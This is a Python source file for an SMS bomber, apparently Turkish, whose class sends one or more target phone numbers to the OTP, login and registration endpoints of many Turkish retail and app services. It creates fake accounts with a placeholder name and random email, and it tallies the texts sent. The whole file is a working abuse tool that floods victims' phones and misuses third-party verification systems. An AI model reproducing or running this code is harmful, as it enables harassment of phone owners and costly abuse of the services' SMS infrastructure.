import requests
from random import choice
from string import ascii_lowercase
from bs4 import BeautifulSoup
from colorama import Fore, Style
from time import sleep
from user_agent import generate_user_agent

class SendSms():
    adet = 0
    toplam_sms = 1
    
   
    def __init__(self, phone, phone2, phone3, phone4, phone5, mail):
        self.phone = str(phone)
        self.phone2 = str(phone2)
        self.phone3 = str(phone3)
        self.phone4 = str(phone4)
        self.phone5 = str(phone5)
        if len(mail) != 0:
            self.mail = mail
        else:
            self.mail = ''.join(choice(ascii_lowercase) for i in range(19))+"@gmail.com"
            
    
    


    # dsmartgo.com.tr
    def Dsmartgo(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                    dsmartgo = requests.post("https://www.dsmartgo.com.tr/web/account/checkphonenumber", data={
        	        "__RequestVerificationToken": "bYFLKS9DehCBAb7l7KaI2WoTdtAJZya-AWsDTmHCl9FnEaUZiF2F1l3XkwppUyT0I3bXMUdUAruBUcqR8jVuLVsxPC41",
        	        "IsSubscriber": "true",
        	        "__reCAPTCHAVerificationToken": "03AGdBq26zV1jYt3RM1kdow0gpFcD7veljQAdV-0QoKLQIWi3voe27TlOwjbktguXtHgngHy13jsTzudfoNuLowIdqG1RcX4_XP5VoXy4un214kmTqChIDJPMKWvkUmLfXvWvXNTdajueI0T4zkdX2VGLz1Vn-uQxRRWxXjY81GZQlLUqu3oOSDYLBN2JH5DPh79Ms4BAxrTFC-ywWIWN1VVN5R2S6R6Ew7iyhDN_QQ1Ow5XcKuT7ycZbMrC_GUML5sKeDgoOtvm4pZ75LKX8ZArd9EPM783h0AXXVMedFGxa0V7a6_FocQ_7PRHeyOnku-HyoMgGZgB7cSIu6tPNddtYGLbOMGhR-2EyCtW4qKq1a9yceT-v7nequ9S0Cr-gYhb7DkjUyk56oUaZD6Za2NzqxIHPzfWC2M9x8WWeiWFqGSCHhjtL29UzGV8HH38X85BEpJKUVc_1U",
        	        "Mobile": numara,
                }, cookies={
        		    "__RequestVerificationToken": "zavKdfCRqVPRUTX-52rcfG8yfGNVfs10gNOb5RIn16upRTctGH4nBp8ReSMxzZUN4cJQTcvY0b4uzP6AL0inDD_cFyA1",
        		    "_ga": "GA1.3.1016548678.1638216163",
        		    "_gat": "1",
        		    "_gat_gtag_UA_18913632_14": "1",
        		    "_gid": "GA1.3.1214889554.1638216163",
        		    "ai_session": "lsdsMzMdX841eBwaKMxd8e|1638216163472|1638216163472",
        		    "ai_user": "U+ClfGV5d2ZK1W1o19UNDn|2021-11-29T20:02:43.148Z"
        	    })
            try:
                BeautifulSoup(dsmartgo.text, "html.parser").find("div", {"class": "info-text"}).text.strip()
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> dsmartgo.com.tr")
            except AttributeError:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> dsmartgo.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                self.adet += 1
                self.toplam_sms += 1
            uygulanan_nolar += 1
            if uygulanan_nolar == bos_olmayan:
                break
            else:
                continue
        

    # kigili.com
    def Kigili(self): 
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    kigili = requests.post("https://www.kigili.com/users/registration/", data={
                    "first_name": "Memati",
                    "last_name": "Bas",
                    "email": self.mail,
                    "phone": f"0{numara}",
                    "password": "31ABC..abc31",
                    "confirm": "true",
                    "kvkk": "true",
                    "next": ""
                })
                    if kigili.status_code == 202:
                         print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> kigili.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                    else:
                        raise 
                except :
                     print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> kigili.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
                else:
                    continue
        

    #kahvedunyasi.com
    def KahveDunyasi(self):    
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    kahve_dunyasi = requests.post("https://core.kahvedunyasi.com/api/users/sms/send", data={
                    "mobile_number": numara,
                    "token_type": "register_token"
                })
                    if len(kahve_dunyasi.json()["meta"]["messages"]["error"]) == 0:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> core.kahvedunyasi.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise 
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> core.kahvedunyasi.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
        

    #naosstars.com
    def NaosStars(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    naosstars = requests.post("https://shop.naosstars.com/users/register/", data={
                    "email": self.mail,
                    "first_name": "Memati",
                    "last_name": "Bas",
                    "password": "31ABC..abc31",
                    "date_of_birth": "1975-12-31",
                    "phone": f"0{numara}",
                    "gender": "male",
                    "kvkk": "true",
                    "contact": "true",
                    "confirm": "true"
                })
                    if naosstars.status_code == 202:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> shop.naosstars.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                       raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> shop.naosstars.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
                else:
                    continue
          
        
    #wmf.com.tr
    def Wmf(self):        
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    wmf = requests.post("https://www.wmf.com.tr/users/register/", data={
                    "confirm": "true",
                    "date_of_birth": "1956-03-01",
                    "email": self.mail,
                    "email_allowed": "true",
                    "first_name": "Memati",
                    "gender": "male",
                    "last_name": "Bas",
                    "password": "31ABC..abc31",
                    "phone": f"0{numara}"
                })
                    if wmf.status_code == 202:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> wmf.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                       raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> wmf.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
                else:
                    continue
         
    
    #istegelsin.com
    def IsteGelsin(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    json={"operationName": "SendOtp2", "query": "mutation SendOtp2($phoneNumber: String!) {\n  sendOtp2(phoneNumber: $phoneNumber) {\n    __typename\n    alreadySent\n    remainingTime\n  }\n}", "variables": {"phoneNumber": "90"+str(numara)}}
                    r = requests.post("https://prod.fasapi.net:443/",  json=json)
                    if (r.json()["data"]["sendOtp2"]["alreadySent"]) == False:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> prod.fasapi.net "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> prod.fasapi.net "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
    
    
    #bim
    def Bim(self):         
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": numara})
                    if bim.status_code == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> bim.veesk.net "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> bim.veesk.net "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
        
    #ceptesok.com
    def Sok(self):

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.post("https://api.ceptesok.com:443/api/users/sendsms",  json={"mobile_number": numara, "token_type": "register_token"})
                    if len(r.json()["meta"]["messages"]["success"]) != 0:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api.ceptesok.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.ceptesok.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #tiklagelsin.com
    def Tiklagelsin(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    json={"operationName": "GENERATE_OTP", 
                             "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", 
                             "variables": {"challenge": "f2523023-283e-46be-b8db-c08f27d3e21c", 
                                         "deviceUniqueId": "3D7C1B44-7F5D-44FC-B3F2-A1024B3AF6D3", 
                                         "phone": numara
                                        }
                            }
                    tiklagelsin = requests.post("https://svc.apps.tiklagelsin.com:443/user/graphql", json=json)
                    if tiklagelsin.json()["data"]["generateOtp"] == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> svc.apps.tiklagelsin.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> svc.apps.tiklagelsin.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    

            
    #a101.com.tr
    def A101(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.a101.com.tr:443/users/otp-login/"
                    data = {"phone": f"0{numara}", "next": "/a101-kapida"}
                    r = requests.post(url,data=data)
                    if (r.status_code) == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> a101.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> a101.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    #englishhome.com
    def Englishhome(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    data = {"first_name": "Memati", "last_name": "Bas", "email": self.mail, "phone": f"0{numara}", "password": "31ABC..abc31", "email_allowed": "true", "sms_allowed": "true", "confirm": "true", "tom_pay_allowed": "true"}
                    home = requests.post("https://www.englishhome.com:443/enh_app/users/registration/", data=data)
                    if home.status_code == 202:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> englishhome.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> englishhome.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
            
    #sakasu.com.tr
    def Sakasu(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    data = {"phone": numara}
                    su = requests.post("https://www.sakasu.com.tr:443/app/api_register/step1", data=data)
                    if su.json()["status"] == "ok":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> sakasu.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> sakasu.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #rentiva.com
    def Rentiva(self): 
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://rentiva.com:443/api/Account/Login"
                    headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "ionic://localhost", "Accept-Encoding": "gzip, deflate", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148", "Accept-Language": "tr-TR,tr;q=0.9"}
                    json={"appleId": None, "code": "", "email": "", "facebookId": None, "googleId": None, "lastName": "", "name": "", "phone": numara, "type": 1}
                    rentiva = requests.post(url, headers=headers, json=json)
                    if rentiva.json()["success"] == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> rentiva.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> rentiva.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #bineq.tech
    def Bineq(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = f"https://bineqapi.heymobility.tech:443/V2//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={numara}"
                    headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/116 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr"}
                    bineq = requests.post(url, headers=headers)
                    if bineq.json()["IsSuccess"] == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> bineqapi.heymobility.tech "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> bineqapi.heymobility.tech "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
            
    #superpedestrian.com
    def Link(self):

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://consumer-auth.linkfleet.de:443/consumer_auth/register"
                    json={"phone_number": f"+90{numara}"}
                    link = requests.post(url, json=json)
                    if link.json()["detail"] == "Ok":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> consumer-auth.linkfleet.de "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> consumer-auth.linkfleet.de "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue

            
    #loncamarket.com
    def Lonca(self):

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json; charset=utf-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.loncamarket.com", "Dnt": "1", "Referer": "https://www.loncamarket.com/bayi/basvuru/sozlesme", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "close"}
                    json={"Address": numara, "ConfirmationType": 0}
                    lonca = requests.post("https://www.loncamarket.com/lid/identity/sendconfirmationcode", headers=headers, json=json, verify=False, timeout=3)
                    if lonca.status_code == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> loncamarket.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> loncamarket.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue  
            
    
    #dgnonline.com
    def Dgn(self):          
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://odeme.dgnonline.com:443/index.php?route=ajax/smsconfirm&type=send&ajax=1"
                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://odeme.dgnonline.com", "Dnt": "1", "Referer": "https://odeme.dgnonline.com/?bd=1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
                    data = {"loginIdentityNumber": "00000000000", "loginMobileNumber": numara}
                    dgn = requests.post(url, headers=headers, data=data)
                    if dgn.status_code == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> odeme.dgnonline.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> odeme.dgnonline.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #yaanimail.com
    def Yaani(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://api.yaanimail.com:443/gateway/v1/accounts/verification-code/send"
                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Content-Type": "application/json"}
                    json={"action": "create", "email": f"{self.random_mail}@yaani.com", "language": "tr", "recovery_options": [{"type": "email", "value": self.mail}, {"type": "msisdn", "value": f"90{numara}"}]}
                    r = requests.post(url, headers=headers, json=json)
                    if r.status_code == 204:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api.yaanimail.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.yaanimail.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue 
            
             
    #defacto.com.tr
    def Defacto(self):
           
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.defacto.com.tr:443/Customer/SendPhoneConfirmationSms"
                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.defacto.com.tr/Login?newUser=True&ReturnUrl=%2FCustomer%2FSendPhoneConfirmationSms", "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.defacto.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
                    data = {"mobilePhone": numara}
                    r = requests.post(url, headers=headers, data=data)
                    if r.json()["Data"]["IsSMSSend"] == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> defacto.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> defacto.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
    
    
    #mopas.com.tr
    def Mopas(self):          
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.get(f"https://mopas.com.tr/sms/activation?mobileNumber={numara}&pwd=&checkPwd=")
                    if r.status_code == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mopas.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mopas.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #icq.net
    def Icq(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://u.icq.net:443/api/v92/rapi/auth/sendCode"
                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json", "Origin": "https://web.icq.com", "Dnt": "1", "Referer": "https://web.icq.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "cross-site", "Te": "trailers"}
                    json={"params": {"application": "icq", "devId": "ic1rtwz1s1Hj1O0r", "language": "en-US", "phone": f"90{numara}", "route": "sms"}, "reqId": "25299-1669396271"}
                    r = requests.post(url, headers=headers, json=json)
                    if r.json()["status"]["code"] == 20000:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> u.icq.net "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> u.icq.net "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #boyner.com
    def Boyner(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.boyner.com.tr:443/v2/customerV2/Register"
                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.boyner.com.tr/uyelik?type=uye-ol", "X-Newrelic-Id": "Vg8GVlZWCBACUFVRAwkEUFY=", "Newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI5MTcwNTAiLCJhcCI6IjMyMjUzNjA4MiIsImlkIjoiODE3YTIyZTZhODQ0OTJlNCIsInRyIjoiMTM0MWRkZThjZWVmMTExMjQ3MGE4NDQ2M2I1YWU4NzgiLCJ0aSI6MTY3MDU1MzA1OTMzNn19", "Traceparent": "00-1341dde8ceef1112470a84463b5ae878-817a22e6a84492e4-01", "Tracestate": "2917050@nr=0-1-2917050-322536082-817a22e6a84492e4----1670553059336", "Content-Type": "application/json;charset=utf-8", "Origin": "https://www.boyner.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
                    json={"Captcha": "", "CaptchaTurn": False, "ConfirmNewPassword": "31ABC..abc31", "isGuestQuickBuy": "false", "Main": {"CellPhone": numara, "day": "31", "Email": self.mail, "FirstName": "Memati", "genderid": "1", "LastName": "Baş", "month": "12", "ReceiveCampaignMessages": True, "year": 1972}, "MembershipAgreement": True, "MembershipAgreementClone": True, "NewPassword": "31ABC..abc31", "ReturnUrl": "/"}
                    r = requests.post(url, headers=headers, json=json)
                    if r.json()["Success"] == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> boyner.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> boyner.com "+numara)
